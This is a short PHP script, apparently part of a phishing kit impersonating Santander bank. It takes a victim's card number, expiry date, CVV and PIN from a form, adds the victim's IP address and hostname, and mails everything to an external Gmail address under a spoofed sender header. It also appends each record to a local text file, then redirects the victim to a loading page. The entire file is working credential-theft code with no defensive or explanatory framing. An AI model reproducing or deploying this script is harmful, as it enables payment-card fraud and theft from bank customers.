<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "__________________Santander_____________\n";
$message .= "\n";
$message .= "CC :  ".$_POST['cc']." \n";
$message .= "Date Ex :  ".$_POST['datex']." \n";
$message .= "Cvv :  ".$_POST['cvv']." \n";
$message .= "Pin :  ".$_POST['pin']." \n";
$message .= "______________ INFOS OF MACHINE _________\n";
$message .= "Ip of Machine              : $ip\n";
$message .= "Host               : $hostname\n";
$message .= "_________| Yawyaw  |__________\n";
$send = "bader.elw@gmail.com";
$subject = "CC |".$_POST['cc']."| $ip ";
$headers = "From:CC Santander <webmaster@cajamar.es>";
mail($send,$subject,$message,$headers);
$fp = fopen('santa.txt', 'a');
fwrite($fp, $message);
fclose($fp);
header("Location: loading.html");

?>